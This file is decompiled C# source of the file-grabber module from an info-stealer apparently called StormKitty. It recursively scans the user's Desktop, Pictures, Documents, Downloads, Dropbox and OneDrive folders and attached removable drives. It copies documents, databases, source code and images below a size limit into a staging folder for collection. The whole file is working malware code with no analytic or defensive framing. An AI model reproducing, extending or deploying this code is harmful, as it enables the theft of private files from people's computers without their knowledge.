using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000019 RID: 25
	internal sealed class FileGrabber
	{
		// Token: 0x06000086 RID: 134 RVA: 0x00005274 File Offset: 0x00003474
		private static string RecordFileType(string type)
		{
			if (!(type == "Document"))
			{
				if (!(type == "DataBase"))
				{
					if (!(type == "SourceCode"))
					{
						if (type == "Image")
						{
							Counter.GrabberImages++;
						}
					}
					else
					{
						Counter.GrabberSourceCodes++;
					}
				}
				else
				{
					Counter.GrabberDatabases++;
				}
			}
			else
			{
				Counter.GrabberDocuments++;
			}
			return type;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000052F0 File Offset: 0x000034F0
		private static string DetectFileType(string ExtensionName)
		{
			string text = ExtensionName.Replace(".", "").ToLower();
			foreach (KeyValuePair<string, string[]> keyValuePair in Config.GrabberFileTypes)
			{
				foreach (string value2 in keyValuePair.Value)
				{
					if (text.Equals(value2))
					{
						return FileGrabber.RecordFileType(keyValuePair.Key);
					}
				}
			}
			return null;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00005390 File Offset: 0x00003590
		private static void GrabFile(string path)
		{
			FileInfo fileInfo = new FileInfo(path);
			if (fileInfo.Length > (long)Config.GrabberSizeLimit)
			{
				return;
			}
			if (FileGrabber.DetectFileType(fileInfo.Extension) == null)
			{
				return;
			}
			string text = Path.Combine(FileGrabber.SavePath, Path.GetDirectoryName(path).Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
			string destFileName = Path.Combine(text, fileInfo.Name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			fileInfo.CopyTo(destFileName, true);
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00005424 File Offset: 0x00003624
		private static void GrabDirectory(string path)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] directories;
			string[] files;
			try
			{
				directories = Directory.GetDirectories(path);
				files = Directory.GetFiles(path);
			}
			catch (UnauthorizedAccessException)
			{
				return;
			}
			catch (AccessViolationException)
			{
				return;
			}
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileGrabber.GrabFile(array[i]);
			}
			foreach (string path2 in directories)
			{
				try
				{
					FileGrabber.GrabDirectory(path2);
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000054B4 File Offset: 0x000036B4
		public static void Run(string sSavePath)
		{
			try
			{
				FileGrabber.SavePath = sSavePath;
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
					{
						FileGrabber.TargetDirs.Add(driveInfo.RootDirectory.FullName);
					}
				}
				if (!Directory.Exists(FileGrabber.SavePath))
				{
					Directory.CreateDirectory(FileGrabber.SavePath);
				}
				List<Thread> list = new List<Thread>();
				using (List<string>.Enumerator enumerator = FileGrabber.TargetDirs.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string dir = enumerator.Current;
						try
						{
							list.Add(new Thread(delegate()
							{
								FileGrabber.GrabDirectory(dir);
							}));
						}
						catch
						{
						}
					}
				}
				foreach (Thread thread in list)
				{
					thread.Start();
				}
				foreach (Thread thread2 in list)
				{
					if (thread2.IsAlive)
					{
						thread2.Join();
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x04000056 RID: 86
		private static string SavePath = "Grabber";

		// Token: 0x04000057 RID: 87
		private static List<string> TargetDirs = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
		};
	}
}
